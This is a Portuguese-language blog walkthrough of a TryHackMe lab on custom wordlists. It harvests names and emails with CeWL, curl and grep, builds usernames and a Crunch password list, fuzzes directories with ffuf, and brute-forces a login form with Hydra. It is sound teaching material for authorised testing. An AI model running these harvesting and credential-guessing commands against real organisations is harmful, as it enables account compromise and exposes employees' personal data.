---
layout: post
title: "O básico de custom wordlists"
description: "Walkthrough prático mostrando como coletar informações, criar wordlists personalizadas, descobrir diretórios e testar credenciais em um laboratório"
date: 2026-10-01
categories: [tutorial, pentest, web, tryhackme]
tags: [osint, cewl, ffuf, hydra, crunch, wordlist, reconnaissance, tryhackme]
---

# O básico de wordlists

## 1. Introdução

Todo mundo já usou a lista rockyou ou do seclists, porem, dependendo de onde vai ser utilizado, é mais interessante criarmos nossa propria lista!
Rescentemente aprendi a usar o cewl, então vamos fazer uma coisa básica de recon e criar uma lista especifica pra um alvo.

O objetivo é:

- encontrar palavras relacionadas à empresa;
- coletar e-mails;
- identificar funcionários;
- gerar possíveis usernames;
- encontrar padrões de senha;
- descobrir diretórios ocultos;
- testar credenciais no formulário de login.

O fluxo é:

```text
Reconhecimento
      ↓
Coleta de informações
      ↓
Criação de wordlists
      ↓
Limpeza e normalização
      ↓
Enumeração com FFUF
      ↓
Descoberta de login
      ↓
Teste de credenciais com Hydra
```

> Este walkthrough foi realizado em ambiente autorizado do TryHackMe. As técnicas devem ser utilizadas apenas em sistemas próprios, laboratórios ou alvos para os quais exista autorização explícita.

---

# 1. Ambiente

Vou utilizar **Kali Linux**.

O IP do alvo vai ser representado como:

```text
<TARGET_IP>
```

Por exemplo:

```text
10.66.176.89
```

O laboratório utiliza dois domínios:

```text
tryfinanceme.local
social.tryfinanceme.local
```

Como esses domínios não existem no DNS público, precisamos informar ao Kali qual IP deve ser associado a eles.

---

# 2. Configurando `/etc/hosts`

Adicionamos os domínios:

```bash
echo '<TARGET_IP> tryfinanceme.local social.tryfinanceme.local' | sudo tee -a /etc/hosts
```

Exemplo:

```bash
echo '10.66.176.89 tryfinanceme.local social.tryfinanceme.local' | sudo tee -a /etc/hosts
```

Isso cria localmente a relação:

```text
10.66.176.89
     │
     ├── tryfinanceme.local
     └── social.tryfinanceme.local
```

Podemos confirmar:

```bash
grep tryfinanceme /etc/hosts
```

E testar a resolução:

```bash
getent hosts tryfinanceme.local
```

Também podemos verificar se o servidor web responde:

```bash
curl -I http://tryfinanceme.local
```

---

## Por que usar `sudo tee -a`?

A room apresenta algo como:

```bash
echo '<TARGET_IP> tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
```

Esse comando funciona se já estivermos como `root`.

Porém, em uma sessão normal do Kali, `/etc/hosts` pertence ao usuário `root`.

O operador:

```text
>>
```

é executado pelo shell do usuário atual.

Por isso isto pode falhar:

```bash
echo '...' >> /etc/hosts
```

com:

```text
Permission denied
```

Usando:

```bash
echo '...' | sudo tee -a /etc/hosts
```

quem abre e escreve no arquivo é o `tee`, executado através do `sudo`.

O `-a` significa **append**, ou seja, adicionar sem apagar o conteúdo existente.

Mas, você pode usar o cat:

```bash
cat >> /etc/hosts <<EOF
10.66.176.89 tryfinanceme.local social.tryfinanceme.local
EOF
```

---

# 3. Criando um workspace

Para não espalhar arquivos pelo sistema, e facilitar a documentação depois, é uma boa prática organizar o que estamos fazendo.

```bash
mkdir -p ~/tryfinanceme
cd ~/tryfinanceme
```

Todo o restante do laboratório será executado dentro dessa pasta.

---

# 4. Coletando palavras com CeWL
Primeiro de tudo, o CeWL é um gerador de wordlist. Para mais informações e como instalar pode consultar o repo oficial:
https://github.com/digininja/CeWL

CeWL significa **Custom Word List generator**.

Ele navega pelas páginas de um site e extrai palavras que podem ser úteis na criação de uma wordlist específica daquele alvo.

Continuando... Execute:

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
```

---

## Entendendo as opções

| Opção | Função |
|---|---|
| `-d 2` | Segue links até dois níveis de profundidade |
| `-m 3` | Coleta palavras com pelo menos três caracteres |
| `--lowercase` | Converte palavras para minúsculas |
| `--with-numbers` | Permite palavras contendo números |
| `-e` | Procura e-mails |
| `--email_file emails.txt` | Salva e-mails encontrados |
| `-w cewl_words.txt` | Salva as palavras |
| URL final | Site que será analisado |

O resultado principal será:

```text
cewl_words.txt
emails.txt
```

Podemos verificar:

```bash
head -20 cewl_words.txt
```

e:

```bash
cat emails.txt
```

O fluxo até aqui é:

```text
Website
   │
   ↓
 CeWL
   │
   ├── palavras → cewl_words.txt
   │
   └── emails   → emails.txt
```

---

# 5. Procurando documentos públicos

Documentos publicados por empresas podem conter informações interessantes, como:

- nomes de funcionários;
- nomes de departamentos;
- projetos;
- tecnologias;
- endereços de e-mail;
- termos internos.

O laboratório possui documentos em:

```text
http://tryfinanceme.local/docs/
```

Vamos baixar os PDFs:

```bash
wget -r -A pdf http://tryfinanceme.local/docs/
```

As opções:

```text
-r
```

significa download recursivo.

```text
-A pdf
```

significa aceitar arquivos PDF.

Podemos listar o que foi encontrado:

```bash
find tryfinanceme.local/docs -type f
```

---

# 6. Extraindo strings dos PDFs

PDFs possuem muitas estruturas internas, mas o comando `strings` consegue localizar sequências de caracteres legíveis.
Assim, podemos fazer um loop pra procurar algumas palavras e salvar em um txt.

Execute:

```bash
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do
  strings -n 5 "$f" |
  grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' \
  >> raw_words.txt
done
```

O fluxo é:

```text
PDF
 ↓
strings
 ↓
texto legível
 ↓
grep
 ↓
remove parte do lixo estrutural
 ↓
raw_words.txt
```

A opção:

```bash
strings -n 5
```

extrai strings com pelo menos cinco caracteres.

Podemos visualizar:

```bash
head -30 raw_words.txt
```

---

# 7. Extraindo e-mails dos PDFs

Agora procuramos especificamente e-mails do domínio:

```text
@tryfinanceme.com
```

Execute:

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' \
  tryfinanceme.local/docs \
  > emails_docs.txt
```

As principais opções do `grep` são:

| Opção | Significado |
|---|---|
| `-R` | Procura recursivamente |
| `-h` | Não mostra o nome dos arquivos |
| `-i` | Ignora maiúsculas/minúsculas |
| `-a` | Trata arquivos como texto |
| `-o` | Mostra apenas a parte encontrada |
| `-P` | Usa regex compatível com Perl |

Veja os resultados:

```bash
cat emails_docs.txt
```

---

# 8. Removendo e-mails duplicados

Use:

```bash
sort -u emails_docs.txt > emails_docs.unique.txt
```

Onde:

```text
sort = ordena
-u   = mantém apenas valores únicos
```

Confira:

```bash
cat emails_docs.unique.txt
```

---

# 9. Transformando e-mails em usernames

Um endereço como:

```text
alex.johnson@tryfinanceme.com
```

pode revelar um username:

```text
alex.johnson
```

Para remover tudo depois de `@`:

```bash
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
```

Confira:

```bash
cat users_from_emails.txt
```

---

# 10. Harvesting de funcionários

O laboratório possui:

```text
social.tryfinanceme.local
```

Primeiro confirmamos que responde:

```bash
curl -I http://social.tryfinanceme.local
```

Na página, os nomes aparecem em elementos HTML semelhantes a:

```html
<h3 class="profile-name">Alex Johnson</h3>
```

Podemos extrair somente os nomes:

```bash
curl -s http://social.tryfinanceme.local/ \
| grep -Po '(?<=<h3 class="profile-name">)[^<]+' \
> names.txt
```

Visualize:

```bash
cat names.txt
```

Isso é um exemplo simples de **harvesting**: coletar informações públicas que posteriormente podem auxiliar a enumeração.

---

# 11. Gerando possíveis usernames

Uma empresa pode usar diferentes convenções para criar usuários.

Para:

```text
Alex Johnson
```

algumas possibilidades comuns seriam:

```text
alex.johnson
ajohnson
alexj
```

Vamos criar essas três variações.

### `firstname.lastname`

```bash
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt
```

Resultado:

```text
alex.johnson
```

### Primeira letra + sobrenome

```bash
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt
```

Resultado:

```text
ajohnson
```

### Nome + primeira letra do sobrenome

```bash
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt
```

Resultado:

```text
alexj
```

Podemos comparar tudo:

```bash
paste names.txt users_first.last.txt users_flast.txt users_firstl.txt
```

---

# 12. Por que limpar as wordlists?

Os dados coletados ainda são brutos.

Podemos ter:

```text
Helios
HELIOS
helios
#helios
/helios
<stream
account
ACCOUNT
```

Utilizar isso diretamente faria ferramentas como `ffuf` realizarem requisições desnecessárias.

O objetivo da limpeza é:

- remover duplicatas;
- converter tudo para minúsculo;
- eliminar caracteres estranhos;
- remover palavras improváveis;
- reduzir o número total de requisições.

---

# 13. Juntando CeWL e PDFs

Combine:

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt
```

Agora temos:

```text
cewl_words.txt ─┐
                ├──→ words_raw.txt
raw_words.txt ──┘
```

Confira:

```bash
wc -l words_raw.txt
head -20 words_raw.txt
```

---

# 14. Normalizando a wordlist

Execute:

```bash
cat words_raw.txt \
| tr '[:upper:]' '[:lower:]' \
| tr -d '\r' \
| grep -P '^[a-z0-9][a-z0-9._-]{4,}$' \
| sort -u \
> words_clean.txt
```

Vamos separar cada parte.

---

## Convertendo para minúsculas

```bash
tr '[:upper:]' '[:lower:]'
```

Transforma:

```text
Helios
HELIOS
Finance
```

em:

```text
helios
helios
finance
```

---

## Removendo carriage return

```bash
tr -d '\r'
```

Windows geralmente usa:

```text
\r\n
```

para terminar linhas.

Linux normalmente utiliza apenas:

```text
\n
```

O comando remove possíveis caracteres `\r` escondidos.

---

## Filtrando palavras

```bash
grep -P '^[a-z0-9][a-z0-9._-]{4,}$'
```

A expressão exige que:

1. a palavra comece com letra ou número;
2. utilize apenas letras, números, `.`, `_` ou `-`;
3. tenha pelo menos cinco caracteres.

Por exemplo:

```text
admin
account
helios
api-v2
finance_portal
login.html
```

podem permanecer.

Enquanto:

```text
#admin
/admin
<test
api
```

são removidos.

---

## Removendo duplicatas novamente

```bash
sort -u
```

É necessário repetir essa etapa porque antes poderíamos ter:

```text
Helios
HELIOS
helios
```

Depois da conversão para minúsculo:

```text
helios
helios
helios
```

Agora `sort -u` deixa apenas:

```text
helios
```

O resultado final:

```text
words_clean.txt
```

Confira:

```bash
wc -l words_clean.txt
head -30 words_clean.txt
```

---

# 16. Consolidando os usernames

Temos:

```text
users_first.last.txt
users_flast.txt
users_firstl.txt
users_from_emails.txt
```

Vamos juntar tudo:

```bash
cat users_first.last.txt \
    users_flast.txt \
    users_firstl.txt \
    users_from_emails.txt \
| sort -u \
> users.txt
```

Confira:

```bash
cat users.txt
```

e:

```bash
wc -l users.txt
```

Agora `users.txt` é nossa lista consolidada.

---

# 16. Criando uma wordlist de senhas com Crunch

Durante o OSINT do laboratório foi identificado um padrão de senha:

```text
Helios20NN!
```

onde:

```text
NN = dois números
```

Isso pode gerar:

```text
Helios2000!
Helios2001!
Helios2002!
...
Helios2099!
```

Em vez de testar milhões de senhas, podemos gerar exatamente essas 100 possibilidades.

Use:

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

---

## Entendendo o Crunch

Os dois valores:

```text
11 11
```

definem:

```text
comprimento mínimo = 11
comprimento máximo = 11
```

A senha:

```text
Helios2000!
```

possui 11 caracteres.

O parâmetro:

```bash
-t Helios20%%!
```

define o template.

No Crunch:

```text
% = número
```

Portanto:

```text
%%
```

gera:

```text
00
01
02
...
99
```

E:

```bash
-o pass_helios.txt
```

salva o resultado.

Confira:

```bash
head pass_helios.txt
```

```bash
tail pass_helios.txt
```

e:

```bash
wc -l pass_helios.txt
```

Devemos ter:

```text
100 pass_helios.txt
```

---

# 17. Estado atual

Agora temos três arquivos importantes:

```text
words_clean.txt
users.txt
pass_helios.txt
```

Cada um possui uma função:

| Arquivo | Uso |
|---|---|
| `words_clean.txt` | Descobrir diretórios e arquivos |
| `users.txt` | Possíveis usernames |
| `pass_helios.txt` | Possíveis senhas |

O fluxo até agora:

```text
        OSINT / Recon
             │
      ┌──────┴──────┐
      │             │
   palavras       pessoas
      │             │
      ↓             ↓
words_clean      users.txt
                      │
               padrão de senha
                      │
                      ↓
              pass_helios.txt
```

---

# 18. Descoberta de diretórios com FFUF

Agora utilizamos nossa wordlist personalizada:

```bash
ffuf -w words_clean.txt \
  -u http://tryfinanceme.local/FUZZ \
  -e .php,.html,/ \
  -mc 200,301,302
```

O `FUZZ` representa o local que será substituído pelas palavras da lista.

Se tivermos:

```text
admin
helios
portal
```

o FFUF testará coisas como:

```text
/admin
/admin.php
/admin.html
/admin/

/helios
/helios.php
/helios.html
/helios/
```

---

## Opções utilizadas

| Opção | Função |
|---|---|
| `-w words_clean.txt` | Wordlist |
| `-u URL/FUZZ` | Local onde cada palavra será inserida |
| `-e .php,.html,/` | Testa extensões e diretórios |
| `-mc 200,301,302` | Mostra apenas esses códigos HTTP |

Os principais códigos são:

```text
200 = conteúdo encontrado
301 = redirecionamento permanente
302 = redirecionamento temporário
```

Durante a enumeração devemos encontrar:

```text
helios/
```

Essa descoberta responde à primeira pergunta da room:

```text
What HTTP status code does ffuf report for helios/?
```

Basta observar:

```text
Status:
```

na linha correspondente.

---

# 19. Filtrando falsos positivos no FFUF

Algumas aplicações devolvem respostas semelhantes mesmo quando o recurso não existe.

Podemos testar:

```bash
curl -i http://tryfinanceme.local/isto-nao-existe-12345
```

Se várias respostas falsas apresentarem, por exemplo:

```text
Size: 1542
```

podemos ignorá-las:

```bash
ffuf -w words_clean.txt \
  -u http://tryfinanceme.local/FUZZ \
  -e .php,.html,/ \
  -mc 200,301,302 \
  -fs 1542
```

Onde:

```text
-fs = filter size
```

Também existe:

```text
-fl
```

para filtrar pela quantidade de linhas.

Não é necessário adicionar filtros se a saída já estiver limpa.

---

# 20. Encontrando o login

A enumeração revela:

```text
/helios/
```

Podemos acessar:

```bash
curl -i http://tryfinanceme.local/helios/
```

ou abrir no navegador:

```text
http://tryfinanceme.local/helios/
```

O formulário está em:

```text
http://tryfinanceme.local/helios/login.php
```

Antes de usar o Hydra, precisamos entender o formato da requisição, podemos usar o comando:

```bash
curl -s http://tryfinanceme.local/helios/login.php \
| grep -Ei '<form|<input'
```
usar o burpsuite, ou verificar o source da página.

O formulário envia algo semelhante a:

```http
POST /helios/login.php HTTP/1.1
Host: tryfinanceme.local
Content-Type: application/x-www-form-urlencoded

username=alex&password=senha
```

Os nomes dos campos são:

```text
username
password
```

Esses valores são importantes para o Hydra.

---

# 21. Testando credenciais com Hydra

Já temos:

```text
users.txt
pass_helios.txt
```

Use:

```bash
hydra \
  -L users.txt \
  -P pass_helios.txt \
  -f \
  -V \
  -t 4 \
  tryfinanceme.local \
  http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

Em uma linha:

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

---

# 22. Entendendo o Hydra

### Lista de usernames

```bash
-L users.txt
```

O `-L` informa uma lista de logins.

---

### Lista de senhas

```bash
-P pass_helios.txt
```

O `-P` informa uma lista de passwords.

---

### Parar quando encontrar uma credencial

```bash
-f
```

Faz o Hydra parar após encontrar uma combinação válida.

---

### Mostrar tentativas

```bash
-V
```

Mostra os pares sendo testados.

---

### Paralelismo

```bash
-t 4
```

Utiliza quatro tarefas simultâneas.

Para este laboratório isso é suficiente.

---

# 23. Entendendo `http-post-form`

A parte principal é:

```text
/helios/login.php:username=^USER^&password=^PASS^:S=THM{
```

Existem três componentes separados por `:`:

```text
/helios/login.php
:
username=^USER^&password=^PASS^
:
S=THM{
```

---

## Primeiro componente — endpoint

```text
/helios/login.php
```

É o endpoint que receberá o POST.

---

## Segundo componente — dados

```text
username=^USER^&password=^PASS^
```

O Hydra substitui:

```text
^USER^
```

pelos valores de:

```text
users.txt
```

e:

```text
^PASS^
```

pelos valores de:

```text
pass_helios.txt
```

Uma requisição pode acabar utilizando:

```text
username=ajohnson&password=Helios2042!
```

Depois:

```text
username=ajohnson&password=Helios2043!
```

e assim por diante.

---

# 24. Como o Hydra identifica sucesso?

Utilizamos:

```text
S=THM{
```

O `S=` representa uma condição de **sucesso**.

Nesse laboratório, quando o login funciona, a resposta contém uma flag que começa com:

```text
THM{
```

Portanto:

```text
tentativa
    │
    ↓
servidor responde
    │
    ├── não contém THM{ → falhou
    │
    └── contém THM{     → sucesso
```

Quando encontrar a combinação correta, o Hydra mostrará algo semelhante a:

```text
[80][http-post-form] host: tryfinanceme.local
login: <USERNAME>
password: <PASSWORD>
```

A resposta da segunda pergunta da room será o valor mostrado depois de:

```text
login:
```

---

# 25. Login final

Com as credenciais encontradas, abra:

```text
http://tryfinanceme.local/helios/
```

ou:

```text
http://tryfinanceme.local/helios/login.php
```

Utilize:

```text
Username: <USERNAME>
Password: <PASSWORD>
```

Após a autenticação será possível visualizar a flag:

```text
THM{...}
```

---

# 26. Estrutura dos arquivos criados

Ao final, nosso diretório terá aproximadamente:

```text
~/tryfinanceme/
│
├── cewl_words.txt
├── emails.txt
│
├── raw_words.txt
├── words_raw.txt
├── words_clean.txt
│
├── emails_docs.txt
├── emails_docs.unique.txt
│
├── names.txt
├── users_first.last.txt
├── users_flast.txt
├── users_firstl.txt
├── users_from_emails.txt
├── users.txt
│
├── pass_helios.txt
│
└── tryfinanceme.local/
    └── docs/
        └── *.pdf
```

---

# 27. Fluxo completo

O processo inteiro pode ser resumido assim:

```text
                   TARGET
                     │
             Reconhecimento
                     │
          ┌──────────┴──────────┐
          │                     │
       Website                 PDFs
          │                     │
        CeWL                  wget
          │                     │
          │                  strings
          │                     │
          └──────────┬──────────┘
                     │
                  palavras
                     │
                     ↓
            limpar / normalizar
                     │
                     ↓
             words_clean.txt
                     │
                     ↓
                   FFUF
                     │
                     ↓
               /helios/
                     │
                     ↓
                login.php
                     │
                     │
     ┌───────────────┴───────────────┐
     │                               │
social.tryfinanceme.local          PDFs
     │                               │
   nomes                           emails
     │                               │
     └───────────────┬───────────────┘
                     │
                     ↓
              usernames possíveis
                     │
                     ↓
                  users.txt

              padrão de senha
                     │
              Helios20NN!
                     │
                     ↓
                   Crunch
                     │
                     ↓
              pass_helios.txt
                     │
                     ↓
        users.txt + pass_helios.txt
                     │
                     ↓
                   Hydra
                     │
                     ↓
             credencial válida
                     │
                     ↓
                   login
                     │
                     ↓
                 THM{...}
```

---

# 28. O principal aprendizado

O que aprendemos com tudo isso, além de mexer um pouco com o `ffuf` ou `Hydra`.

A metodologia é:

```text
Recon → informação → hipótese → wordlist → enumeração → validação
```

Começar imediatamente com uma wordlist gigantesca pode gerar milhares ou milhões de tentativas inúteis.

Informações específicas sobre o alvo podem reduzir drasticamente esse espaço.

Por exemplo:

```text
Funcionários públicos
        ↓
padrões de usernames
        ↓
users.txt
```

e:

```text
informação sobre política de senha
        ↓
Helios20NN!
        ↓
apenas 100 combinações
```

Da mesma forma:

```text
site + documentos
        ↓
vocabulário específico da empresa
        ↓
words_clean.txt
        ↓
descoberta de /helios/
```

Esse é o conceito central de **custom wordlists**: transformar informações obtidas durante o reconhecimento em dados diretamente úteis durante a enumeração.

---

# 29. Comandos principais — referência rápida

## `/etc/hosts`

```bash
echo '<TARGET_IP> tryfinanceme.local social.tryfinanceme.local' | sudo tee -a /etc/hosts
```

## Workspace

```bash
mkdir -p ~/tryfinanceme
cd ~/tryfinanceme
```

## CeWL

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
```

## Download dos PDFs

```bash
wget -r -A pdf http://tryfinanceme.local/docs/
```

## Strings dos PDFs

```bash
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do
  strings -n 5 "$f" |
  grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' \
  >> raw_words.txt
done
```

## E-mails dos PDFs

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
```

## Remover duplicados

```bash
sort -u emails_docs.txt > emails_docs.unique.txt
```

## E-mail → username

```bash
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
```

## Funcionários

```bash
curl -s http://social.tryfinanceme.local/ | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

## Username `first.last`

```bash
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt
```

## Username `flast`

```bash
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt
```

## Username `firstl`

```bash
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt
```

## Juntar palavras

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt
```

## Limpar wordlist

```bash
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```

## Consolidar usernames

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt | sort -u > users.txt
```

## Gerar senhas

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

## FFUF

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
```

## Hydra

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

---

## Conclusão

Esta room demonstra bem a diferença entre simplesmente utilizar ferramentas e aplicar uma metodologia de reconhecimento.

As ferramentas utilizadas foram:

```text
CeWL
wget
strings
grep
awk
sort
Crunch
FFUF
Hydra
```

Mas o mais importante foi a sequência:

```text
coletar
  ↓
entender
  ↓
organizar
  ↓
reduzir
  ↓
enumerar
  ↓
validar
```

Quanto melhor for o reconhecimento, mais específicas podem ser as wordlists e menor tende a ser a quantidade de tentativas necessárias nas fases seguintes.

Em pentest, CTF e bug bounty, essa lógica pode ser aplicada não apenas a diretórios e credenciais, mas também a:

- subdomínios;
- endpoints de APIs;
- parâmetros;
- nomes de arquivos;
- tecnologias;
- padrões internos de nomenclatura;
- usuários e serviços.

A ferramenta executa o teste. O reconhecimento é o que ajuda a decidir **o que vale a pena testar**.
